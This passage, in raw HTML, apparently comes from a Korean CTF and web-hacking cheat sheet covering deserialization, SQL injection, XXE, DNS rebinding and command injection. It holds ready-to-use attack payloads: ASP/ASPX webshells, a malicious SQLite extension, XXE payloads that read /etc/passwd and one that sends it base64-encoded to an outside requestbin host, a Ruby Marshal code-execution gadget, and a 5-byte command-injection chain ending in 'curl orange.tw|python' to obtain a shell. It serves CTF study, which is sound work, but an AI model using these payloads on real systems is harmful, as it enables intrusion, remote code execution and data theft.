arguments'</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">print(<span class="string">'[*] '</span> + str(pickle.loads(base64.b64decode(sys.argv[<span class="number">1</span>]))))</span><br></pre></td></tr></table></figure></li><li><p>pickle (for test)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, cPickle, base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    print(<span class="string">'[!] no arguments'</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">print(<span class="string">'[*] '</span> + str(cPickle.loads(base64.b64decode(sys.argv[<span class="number">1</span>]))))</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>php</p><ul><li><p>PHPGGC</p><ul><li>원데이 가젯들을 사용하여 페이로드 자동 구성해주는 도구</li><li><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">https://github.com/ambionics/phpggc</a></li></ul></li><li><p>unserlize + replace 문제<br>제거되는 문자열로 인하여 길이 오프셋이 달라지는 취약점을 사용, 이를 통해 객체 조작이 가능해짐<br>이 타입 문제의 경우 에러 메시지를 비활성화 해놓는 경우가 많으며, <code>extract</code> 함수 등과 같이 쓰이기도 한다.</p></li><li><p>member methods</p><ul><li>__construct<ul><li>설명추가예정</li></ul></li><li>__destruct<ul><li>설명추가예정</li></ul></li><li>__wakeup<ul><li>설명추가예정</li></ul></li><li>__sleep<ul><li>설명추가예정</li></ul></li><li>__toString<ul><li>설명추가예정</li></ul></li></ul></li><li><p>symbols</p><ul><li><p><code>s</code> : String</p></li><li><p><code>i</code> : Integer</p></li><li><p><code>b</code> : Boolean</p></li><li><p><code>N</code> : NULL</p></li><li><p><code>a</code> : Array</p></li><li><p><code>O</code> : Object</p><ul><li><p>public property</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#123;s:4:&quot;test&quot;;...&#125;</span><br></pre></td></tr></table></figure></li><li><p>private property</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#123;s:12:&quot;%00Kaibro%00test&quot;&#125;</span><br></pre></td></tr></table></figure></li><li><p>protected property</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#123;s:7:&quot;%00*%00test&quot;;...&#125;</span><br></pre></td></tr></table></figure></li><li><p>private와 protected property는 직접 손으로 작성하여 구성하거나, constructor 에 멤버 변수 할당하도록 클래스 선언한 후, serialize 하면 됨.</p></li></ul></li><li><p><code>C</code> : custom object</p></li><li><p><code>R</code> : pointer reference</p></li></ul></li></ul></li><li><p>java</p><ul><li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure</a> Deserialization/Java.md)</li></ul></li><li><p>ruby</p><ul><li><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md</a></p></li><li><p>Marshal</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">erb = ERB.allocate</span><br><span class="line">erb.instance_variable_set <span class="symbol">:</span>@src, <span class="string">"`id`"</span></span><br><span class="line">depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, <span class="symbol">:result</span>, <span class="string">"foo"</span>, ActiveSupport::Deprecation</span><br><span class="line">hash = &#123;depr =&gt; <span class="string">'something'</span>&#125;</span><br><span class="line">marshalled = Marshal.dump(hash)</span><br><span class="line">print marshalled</span><br></pre></td></tr></table></figure></li><li><p>.NET deserialization</p><ul><li><a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">https://github.com/pwntester/ysoserial.net</a></li><li><a href="https://blog.15.165.0.114/2018/10/24/HITCON-CTF-2018-Web/" target="_blank" rel="noopener">https://blog.15.165.0.114/2018/10/24/HITCON-CTF-2018-Web/</a></li></ul></li></ul></li></ul><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><ul><li>2버전에서 mac 주소 등을 이용하여 시크릿 알아낼수 있는, 취약함수 존재, CTF에 종종 출제됨 [설명 추가 예정]</li><li>pyjail<ul><li>[삭제 여부 검토]</li></ul></li></ul><h2 id="Directory-Traversal"><a href="#Directory-Traversal" class="headerlink" title="Directory Traversal"></a>Directory Traversal</h2><ul><li>생략</li><li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory</a> Traversal)</li></ul><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><ul><li>생략</li><li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command</a> Injection)</li></ul><h2 id="asp-net-iis"><a href="#asp-net-iis" class="headerlink" title="asp.net / iis"></a>asp.net / iis</h2><ul><li><p>asp webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;kaibro&quot;)%&gt;</span><br><span class="line">&lt;%execute request(&quot;kaibro&quot;)%&gt;</span><br><span class="line">&lt;%ExecuteGlobal request(&quot;kaibro&quot;)%&gt;</span><br><span class="line">&lt;%response.write CreateObject(&quot;WScript.Shell&quot;).Exec(Request.QueryString(&quot;cmd&quot;)).StdOut.Readall()%&gt;</span><br></pre></td></tr></table></figure></li><li><p>aspx webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;kaibro&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if (Request.Files.Count!&#x3D;0)&#123;Request.Files[0].SaveAs(Server.MapPath(Request[&quot;f&quot;]));&#125;%&gt;</span><br></pre></td></tr></table></figure></li><li><p>ibm038</p><ul><li><a href="https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour" target="_blank" rel="noopener">https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour</a></li></ul></li><li><p>__VIEWSTATE</p><ul><li><a href="https://cyku.tw/ctf-hitcon-2018-why-so-serials/" target="_blank" rel="noopener">https://cyku.tw/ctf-hitcon-2018-why-so-serials/</a></li></ul></li></ul><h2 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h2><ul><li>function override</li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">math:random</span><span class="params">()</span></span> <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">math</span>:<span class="built_in">random</span>())</span><br><span class="line">// <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="GraphQL-Injection"><a href="#GraphQL-Injection" class="headerlink" title="GraphQL Injection"></a>GraphQL Injection</h2><ul><li>추가예정</li></ul><h2 id="sql-injection"><a href="#sql-injection" class="headerlink" title="sql injection"></a>sql injection</h2><ul><li><p>basic (생략)</p></li><li><p>quine sql injection</p><ul><li><a href="https://blog.rwx.kr/quine-sql-injection/" target="_blank" rel="noopener">https://blog.rwx.kr/quine-sql-injection/</a></li></ul></li><li><p>nosql injection</p><ul><li>설명 생략</li></ul></li><li><p>sqlite</p><ul><li>rce via load_extension<ul><li>윈도우 환경이면 UNC 도 사용가능</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; gcc -shared -fPIC evil.c -o evil.so</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int sqlite3_evil_init() &#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int sqlite3__init() &#123;</span><br><span class="line">    system(&quot;touch &#x2F;tmp&#x2F;executed&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_extension(&#39;&#x2F;tmp&#x2F;evil.so&#39;);</span><br></pre></td></tr></table></figure></li><li><p>mysql</p><ul><li>multiquery injection</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a&#x3D;&#39;select sleep(1)&#39;;</span><br><span class="line">prepare s from @a;</span><br><span class="line">execute s;</span><br></pre></td></tr></table></figure><ul><li>rand alternative</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when @a:&#x3D;@a-2 then @a:&#x3D;2 else @a:&#x3D;1 end;</span><br></pre></td></tr></table></figure><ul><li>mysql client attack</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lcark/MysqlClientAttack.git</span><br><span class="line"><span class="built_in">cd</span> MysqlClientAttack</span><br><span class="line">python main.py -F /flag</span><br></pre></td></tr></table></figure><ul><li><p>shell command : show columns</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show columns from &#96;tbl&#96;</span><br></pre></td></tr></table></figure></li><li><p>shell command : handler</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl OPEN;HANDLER tbl READ FIRST;HANDLER CLOSE</span><br></pre></td></tr></table></figure></li><li><p>list table with innodb &gt; 5.6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from innodb_table_stats;</span><br><span class="line">select * from innodb_index_stats;</span><br></pre></td></tr></table></figure></li><li><p>list table with statistics</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schema_auto_increment_columns</span><br><span class="line">schema_table_statistics_with_buffer</span><br><span class="line">x$schema_table_statistics_with_buffer</span><br></pre></td></tr></table></figure></li></ul></li><li><p>waf bypass</p></li></ul><h2 id="XML-External-Entity-Injection"><a href="#XML-External-Entity-Injection" class="headerlink" title="XML External Entity Injection"></a>XML External Entity Injection</h2><ul><li><p>basic (생략)</p></li><li><p>php wrapper (생략)</p></li><li><p>dos (생략)</p></li><li><p>error based (생략)</p></li><li><p>soap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;soap:Body&gt;</span><br><span class="line">  &lt;foo&gt;</span><br><span class="line">    &lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:22&#x2F;&quot;&gt; %dtd;]&gt;&lt;xxx&#x2F;&gt;]]&gt;</span><br><span class="line">  &lt;&#x2F;foo&gt;</span><br><span class="line">&lt;&#x2F;soap:Body&gt;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>utf7</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-7"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">@utf7</span>&gt;</span><span class="meta">&lt;!DOCTYPE r[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY x <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;x;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span><span class="tag">&lt;<span class="name">@</span>/<span class="attr">utf7</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>utf16</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">@UTF_16_3</span>&gt;</span><span class="meta">&lt;?xml version="1.0" encoding="UTF-16"?&gt;</span><span class="tag">&lt;<span class="name">r</span>&gt;</span>123<span class="tag">&lt;/<span class="name">r</span>&gt;</span><span class="tag">&lt;<span class="name">@</span>/<span class="attr">UTF_16_3</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>oob xxe</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 1.xml</span><br><span class="line"><span class="tag">&lt;<span class="name">@UTF_16_3</span>&gt;</span><span class="meta">&lt;?xml version="1.0" encoding="UTF-16"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % x <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://git.buuoj.cn/posix/xxe/raw/master/1.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%x;</span></span><br><span class="line"><span class="meta">%p;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;exfil;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span><span class="tag">&lt;<span class="name">@</span>/<span class="attr">UTF_16_3</span>&gt;</span></span><br><span class="line">// 1.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % d <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/convert.base64-encode/resource=/etc/passwd"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % p <span class="meta-string">"&lt;!ENTITY exfil SYSTEM 'http://http.requestbin.buuoj.cn/138ccqt1?d=%d;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>syntax violation</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///var/www/html/index.php"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">"&lt;![CDATA["</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">"]]&gt;"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY fileContents '%start;%file;%end;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>local dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamsa</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">  &lt;!ENTITY % request "&lt;!ENTITY &amp;#x25; error SYSTEM '</span>file:///x/%file;&amp;#x27;&gt;</span>"&gt;</span></span><br><span class="line"><span class="meta">  %request;%error;'&gt;</span></span><br><span class="line"><span class="meta">%local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>123<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>phar</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" standalone="yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ernw</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"phar:///var/www/html/images/gginin/xxxx.jpeg"</span> &gt;</span> ]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"500px"</span> <span class="attr">height</span>=<span class="string">"100px"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">version</span>=<span class="string">"1.1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">font-family</span>=<span class="string">"Verdana"</span> <span class="attr">font-size</span>=<span class="string">"16"</span> <span class="attr">x</span>=<span class="string">"10"</span> <span class="attr">y</span>=<span class="string">"40"</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>oxml_xxe</p><ul><li><a href="https://github.com/BuffaloWill/oxml_xxe" target="_blank" rel="noopener">https://github.com/BuffaloWill/oxml_xxe</a></li><li>DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF</li></ul></li></ul><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul><li>length extension attack<ul><li>[설명추가예정]</li><li><a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">https://github.com/bwall/HashPump</a></li></ul></li><li>Oracle Padding Attack<ul><li>[설명추가예정]</li></ul></li><li>ECB 블록 셔플 공격 (CTF에 나온지는 꽤 되었지만, 나름 범용적인 공격)</li><li>CBC mode - Bit Flipping Attack<ul><li>[설명추가예정]</li></ul></li></ul><h2 id="misc-universal"><a href="#misc-universal" class="headerlink" title="misc / universal"></a>misc / universal</h2><ul><li><p>zip slip attack</p></li><li><p>bad regex bypass</p></li><li><p>race condition</p></li><li><p>bom injection</p></li><li><p>weak rand / srand() (언어별로)</p></li><li><p>cron / .bashrc / .zshrc</p></li><li><p>windows fs regex</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">target: flag.txt</span><br><span class="line">matched by</span><br><span class="line">1. flag.&gt;&gt;&gt;</span><br><span class="line">2. f&lt;</span><br><span class="line">3. flag&quot;txt</span><br></pre></td></tr></table></figure></li><li><p>time based regex injection</p><ul><li><a href="https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques" target="_blank" rel="noopener">https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques</a></li><li><a href="https://blog.rwx.kr/time-based-regex-injection/" target="_blank" rel="noopener">https://blog.rwx.kr/time-based-regex-injection/</a></li></ul></li><li><p>apache solr injection</p><ul><li><a href="https://github.com/veracode-research/solr-injection" target="_blank" rel="noopener">https://github.com/veracode-research/solr-injection</a></li></ul></li><li><p>dns rebinding</p><ul><li><code>7f000001.0fa50072.rbndr.us</code></li><li><a href="https://lock.cmpxchg8b.com/rebinder.html" target="_blank" rel="noopener">https://lock.cmpxchg8b.com/rebinder.html</a></li><li>nodejs 사용하여 dns 서버 구성</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; sudo systemctl disable systemd-resolved</span><br><span class="line">&#x2F;&#x2F; sudo systemctl stop systemd-resolved</span><br><span class="line"></span><br><span class="line">const dns &#x3D; require(&#39;dns2&#39;);</span><br><span class="line">var check &#x3D; true;</span><br><span class="line">const server &#x3D; dns.createServer((req,send) &#x3D;&gt; &#123;</span><br><span class="line">    const response &#x3D; new dns.Packet(req);</span><br><span class="line">    check &#x3D; !check;</span><br><span class="line">    response.header.qr &#x3D; 1;</span><br><span class="line">    response.answers.push(&#123;</span><br><span class="line">        address: check ? &#39;127.0.0.1&#39; : &#39;1.2.3.4&#39;,</span><br><span class="line">        type: dns.Packet.TYPE.A,</span><br><span class="line">        class: dns.Packet.CLASS.IN</span><br><span class="line">    &#125;);</span><br><span class="line">    send(response);</span><br><span class="line">&#125;).listen(53);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; sudo systemctl enable systemd-resolved</span><br><span class="line">&#x2F;&#x2F; sudo systemctl start systemd-resolved</span><br></pre></td></tr></table></figure></li><li><p>unicode normaliation</p><ul><li>언어마다 다름</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[223] ß (%C3%9F).toUpperCase() &#x3D;&gt; SS (%53%53)</span><br><span class="line">[304] İ (%C4%B0).toLowerCase() &#x3D;&gt; i̇ (%69%307)</span><br><span class="line">[305] ı (%C4%B1).toUpperCase() &#x3D;&gt; I (%49)</span><br><span class="line">[329] ŉ (%C5%89).toUpperCase() &#x3D;&gt; ʼN (%2bc%4e)</span><br><span class="line">[383] ſ (%C5%BF).toUpperCase() &#x3D;&gt; S (%53)</span><br><span class="line">[496] ǰ (%C7%B0).toUpperCase() &#x3D;&gt; J̌ (%4a%30c)</span><br><span class="line">[7830] ẖ (%E1%BA%96).toUpperCase() &#x3D;&gt; H̱ (%48%331)</span><br><span class="line">[7831] ẗ (%E1%BA%97).toUpperCase() &#x3D;&gt; T̈ (%54%308)</span><br><span class="line">[7832] ẘ (%E1%BA%98).toUpperCase() &#x3D;&gt; W̊ (%57%30a)</span><br><span class="line">[7833] ẙ (%E1%BA%99).toUpperCase() &#x3D;&gt; Y̊ (%59%30a)</span><br><span class="line">[7834] ẚ (%E1%BA%9A).toUpperCase() &#x3D;&gt; Aʾ (%41%2be)</span><br><span class="line">[8490] K (%E2%84%AA).toLowerCase() &#x3D;&gt; k (%6b)</span><br><span class="line">[64256] ﬀ (%EF%AC%80).toUpperCase() &#x3D;&gt; FF (%46%46)</span><br><span class="line">[64257] ﬁ (%EF%AC%81).toUpperCase() &#x3D;&gt; FI (%46%49)</span><br><span class="line">[64258] ﬂ (%EF%AC%82).toUpperCase() &#x3D;&gt; FL (%46%4c)</span><br><span class="line">[64259] ﬃ (%EF%AC%83).toUpperCase() &#x3D;&gt; FFI (%46%46%49)</span><br><span class="line">[64260] ﬄ (%EF%AC%84).toUpperCase() &#x3D;&gt; FFL (%46%46%4c)</span><br><span class="line">[64261] ﬅ (%EF%AC%85).toUpperCase() &#x3D;&gt; ST (%53%54)</span><br><span class="line">[64262] ﬆ (%EF%AC%86).toUpperCase() &#x3D;&gt; ST (%53%54)</span><br></pre></td></tr></table></figure></li><li><p>5 byte command injection</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># generate &#96;ls -t&gt;g&#96; to file &quot;_&quot;</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;ls\</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;ls&gt;_</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;\ \</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;-t\</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;\&gt;g</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;ls&gt;&gt;_</span><br><span class="line"></span><br><span class="line"># generate &#96;curl orange.tw|python&#96; to file &quot;g&quot;</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;on</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;th\</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;py\</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;\|\</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;tw\</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;e.\</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;ng\</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;ra\</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;o\</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;\ \</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;rl\</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;&gt;cu\</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;sh _</span><br><span class="line"></span><br><span class="line"># got shell</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;?cmd&#x3D;sh g</span><br></pre></td></tr></table></figure></li></ul><h2 id="AWS"><a 